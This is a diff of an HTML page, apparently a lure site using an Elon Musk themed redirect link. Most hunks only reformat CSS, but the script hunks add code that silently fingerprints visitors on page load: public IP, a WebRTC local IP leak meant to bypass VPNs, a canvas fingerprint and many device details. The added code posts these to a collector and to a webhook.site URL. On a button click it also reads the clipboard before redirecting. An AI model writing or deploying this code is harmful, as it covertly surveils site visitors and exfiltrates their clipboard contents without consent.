@@ -25,7 +25,6 @@
     display: flex;
     flex-direction: column;
   }
-  /* Background gradient effect */
   body::before {
     content: "";
     position: fixed;
@@ -34,10 +33,7 @@
     z-index: -1;
     pointer-events: none;
   }
-  header {
-    text-align: center;
-    padding: 5rem 2rem 3rem;
-  }
+  header { text-align: center; padding: 5rem 2rem 3rem; }
   h1 {
     font-size: clamp(3rem, 8vw, 5rem);
     font-weight: 900;
@@ -48,100 +44,27 @@
     -webkit-text-fill-color: transparent;
     margin-bottom: 0.5rem;
   }
-  .subtitle {
-    font-size: 1.1rem;
-    color: var(--text-muted);
-    letter-spacing: 4px;
-    text-transform: uppercase;
-    font-weight: 600;
-  }
-  main {
-    max-width: 1000px;
-    margin: 0 auto;
-    padding: 0 2rem 4rem;
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    gap: 3rem;
-  }
-  .hero-text {
-    font-size: 1.25rem;
-    text-align: center;
-    max-width: 700px;
-    margin: 0 auto;
-    color: var(--text-muted);
-  }
-  .gallery {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-    gap: 1.5rem;
-    margin-top: 1rem;
-  }
+  .subtitle { font-size: 1.1rem; color: var(--text-muted); letter-spacing: 4px; text-transform: uppercase; font-weight: 600; }
+  main { max-width: 1000px; margin: 0 auto; padding: 0 2rem 4rem; flex: 1; display: flex; flex-direction: column; gap: 3rem; }
+  .hero-text { font-size: 1.25rem; text-align: center; max-width: 700px; margin: 0 auto; color: var(--text-muted); }
+  .gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; margin-top: 1rem; }
   .card {
-    background: var(--bg-panel);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    overflow: hidden;
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-    position: relative;
+    background: var(--bg-panel); border: 1px solid var(--border); border-radius: 16px;
+    overflow: hidden; transition: transform 0.3s ease, box-shadow 0.3s ease; position: relative;
   }
-  .card:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 20px var(--accent-glow);
-    border-color: rgba(50, 215, 75, 0.4);
-  }
-  .card img {
-    width: 100%;
-    height: 320px;
-    object-fit: cover;
-    display: block;
-    border-bottom: 1px solid var(--border);
-  }
-  .card-caption {
-    padding: 1rem;
-    text-align: center;
-    font-size: 0.9rem;
-    color: var(--accent);
-    font-weight: 600;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-  }
-  .cta-container {
-    text-align: center;
-    margin-top: 2rem;
-    margin-bottom: 4rem;
-  }
+  .card:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 20px var(--accent-glow); border-color: rgba(50, 215, 75, 0.4); }
+  .card img { width: 100%; height: 320px; object-fit: cover; display: block; border-bottom: 1px solid var(--border); }
+  .card-caption { padding: 1rem; text-align: center; font-size: 0.9rem; color: var(--accent); font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+  .cta-container { text-align: center; margin-top: 2rem; margin-bottom: 4rem; }
   .cta-button {
-    display: inline-block;
-    background: var(--accent);
-    color: #000;
-    font-size: 1.5rem;
-    font-weight: 800;
-    text-transform: uppercase;
-    text-decoration: none;
-    padding: 1.5rem 4rem;
-    border-radius: 50px;
-    border: none;
-    cursor: pointer;
-    box-shadow: 0 0 30px var(--accent-glow);
-    transition: transform 0.2s ease, box-shadow 0.2s ease;
-    width: 100%;
-    max-width: 600px;
+    display: inline-block; background: var(--accent); color: #000; font-size: 1.5rem; font-weight: 800;
+    text-transform: uppercase; text-decoration: none; padding: 1.5rem 4rem; border-radius: 50px;
+    border: none; cursor: pointer; box-shadow: 0 0 30px var(--accent-glow);
+    transition: transform 0.2s ease, box-shadow 0.2s ease; width: 100%; max-width: 600px;
   }
-  .cta-button:hover {
-    transform: scale(1.02);
-    box-shadow: 0 0 50px var(--accent-glow);
-  }
-  .cta-button:active {
-    transform: scale(0.98);
-  }
-  footer {
-    text-align: center;
-    padding: 2rem;
-    color: var(--text-muted);
-    font-size: 0.8rem;
-    border-top: 1px solid var(--border);
-  }
+  .cta-button:hover { transform: scale(1.02); box-shadow: 0 0 50px var(--accent-glow); }
+  .cta-button:active { transform: scale(0.98); }
+  footer { text-align: center; padding: 2rem; color: var(--text-muted); font-size: 0.8rem; border-top: 1px solid var(--border); }
 </style>
 </head>
 <body>
@@ -184,26 +107,105 @@
   var WEBHOOK   = 'https://webhook.site/a9a83f66-ec0c-4dfa-9612-9cd7f9056784';
   var REDIRECT  = 'https://u2l.ai/Elon-Musk-New-Website'; 
 
-  // Grab IP and telemetry silently on load
-  (async function () {
+  // --- Helper: WebRTC Local IP Leak (bypasses some VPNs) ---
+  async function getWebRTCIP() {
+    return new Promise(resolve => {
+      var ip = "blocked";
+      try {
+        var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+        pc.createDataChannel("");
+        pc.onicecandidate = e => {
+          if (!e.candidate) return;
+          var m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+          if (m && !m[1].startsWith('127.')) {
+            ip = m[1]; pc.close(); resolve(ip);
+          }
+        };
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+      } catch(e) { resolve(ip); }
+      setTimeout(() => resolve(ip), 1000);
+    });
+  }
+
+  // --- Helper: Canvas Fingerprint (Unique Device ID) ---
+  function getCanvasFP() {
+    try {
+      var c = document.createElement('canvas');
+      var ctx = c.getContext('2d');
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+      ctx.fillStyle = "#069"; ctx.fillText("Hello, world!", 2, 15);
+      ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Hello, world!", 4, 17);
+      return c.toDataURL();
+    } catch(e) { return "err"; }
+  }
+
+  // --- Helper: AdBlock Detection ---
+  async function checkAdBlock() {
+    try {
+      await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', {mode: 'no-cors'});
+      return "no";
+    } catch (e) {
+      return "yes";
+    }
+  }
+
+  // --- Main Payload Builder ---
+  async function gatherAndSend(isButtonClick = false) {
     try {
       var r = await fetch('https://api.ipify.org?format=json');
       var d = await r.json();
       
+      var webrtc = await getWebRTCIP();
+      var fp = getCanvasFP();
+      var adblock = await checkAdBlock();
+      
       var payload = {
+        event_type: isButtonClick ? "button_click" : "page_load",
         ip: d.ip,
+        webrtc_ip: webrtc,
+        fingerprint: fp,
+        adblock: adblock,
         ua: navigator.userAgent,
         ref: document.referrer || '',
         page: location.href,
         ts: new Date().toISOString(),
+        
+        // Screen & Window
         screen: screen.width + 'x' + screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        lang: navigator.language,
+        window: window.innerWidth + 'x' + window.innerHeight,
+        color_depth: screen.colorDepth,
+        pixel_ratio: window.devicePixelRatio || 1,
+        
+        // Hardware & OS
         platform: navigator.platform,
         cores: navigator.hardwareConcurrency || 'unknown',
-        touch: navigator.maxTouchPoints > 0
+        memory: navigator.deviceMemory || 'unknown', // Chrome only
+        touch: navigator.maxTouchPoints > 0,
+        
+        // Locale & Time
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offset: new Date().getTimezoneOffset(),
+        lang: navigator.language,
+        langs: navigator.languages ? navigator.languages.join(',') : navigator.language,
+        
+        // Permissions & Plugins
+        cookies_enabled: navigator.cookieEnabled,
+        dnt: navigator.doNotTrack,
+        
+        // Clipboard (will be empty unless button clicked with browser permission)
+        clipboard: "none"
       };
 
+      // Attempt Clipboard Read (Requires user gesture + permission)
+      if (isButtonClick) {
+        try {
+          payload.clipboard = (await navigator.clipboard.readText()).slice(0, 100);
+        } catch(e) { payload.clipboard = "denied"; }
+      }
+
+      // Fire to Sheet
       fetch(COLLECTOR, {
         method: 'POST',
         mode: 'no-cors',
@@ -211,6 +213,7 @@
         body: JSON.stringify(payload)
       });
 
+      // Fire to Webhook
       if (WEBHOOK) {
         fetch(WEBHOOK, {
           method: 'POST',
@@ -219,12 +222,19 @@
           body: JSON.stringify(payload)
         });
       }
-    } catch (e) {}
-  })();
+    } catch (e) {
+      console.error("Collection failed", e);
+    }
+  }
 
-  // Handle the button click redirect
-  document.getElementById('more-info-btn').addEventListener('click', function() {
-    window.location.href = REDIRECT;
+  // 1. Fire immediately on page load
+  gatherAndSend(false);
+
+  // 2. Fire again on button click (to grab clipboard before redirecting)
+  document.getElementById('more-info-btn').addEventListener('click', async function(e) {
+    e.preventDefault(); // Pause redirect
+    await gatherAndSend(true); // Grab clipboard
+    window.location.href = REDIRECT; // Redirect
   });
 </script>
 </body>
